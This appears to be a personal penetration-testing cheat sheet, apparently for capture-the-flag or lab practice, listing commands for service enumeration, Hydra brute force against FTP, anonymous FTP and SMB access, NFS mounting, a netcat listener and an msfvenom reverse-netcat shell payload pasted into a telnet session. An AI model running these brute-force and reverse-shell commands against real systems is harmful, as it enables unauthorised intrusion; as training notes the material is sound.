# Cheatsheet

### Common 
* ```wget http://127.0.0.1:8000/file```
* ```python3 -m http.server```
* ```systemctl stop myservice```
* [-h / -help / --help] or man
* https://www.exploit-db.com/exploits/20745
* 
## Useful location  
  ### .ssh Key 
   * Private key ssh ```/home/user-name/.ssh```
   * This file is the private key ```id_rsa```
   * change the file permission ``` chmod 600 ```

  ### Nmap


# Fast Tool 
## Netcat
* nc -lvp [listening port], `nc -lvp 4444`

## Hydra 
* used to brute force Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB
* hydra -t 4 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp



# Services  
## SMB
### Enumerating SMB
* enum4linux [options] ip
* use option  ```-a``` all of the above (full basic enumeration)

### SMB Exploit 445, 139
* smbclient //[IP]/[SHARE]
* smbclient //10.10.10.2/sharefilename -U username -p 445

## Telnet 23
### Enumerating Telnet
* nmap
### Exploiting
* telnet [ip] [port]

## FTP 21
### channels 
* a command (sometimes called the control) channel
* a data channel.
### Enumerating FTP
* nmap
### Exploiting
* "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.

## NFS 
### NFS Tools
* `sudo apt install nfs-common`
* by defualt mount,showmount, nfsstat, gssd, idmapd, lockd, statd,
### Enumeration
* nmap
* show all shares `/usr/sbin/showmount -e [IP] `
### Exploiting
* create folder `mkdir /tmp/mount`
* 'sudo mount -t nfs IP:share /tmp/mount/ -nolock'

# Shells 
## Simple Shell msfvenom 

* using telnet 
```
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

```
* copy and paste the value on telnet session 

# other Important 
## Start a tcpdump listener

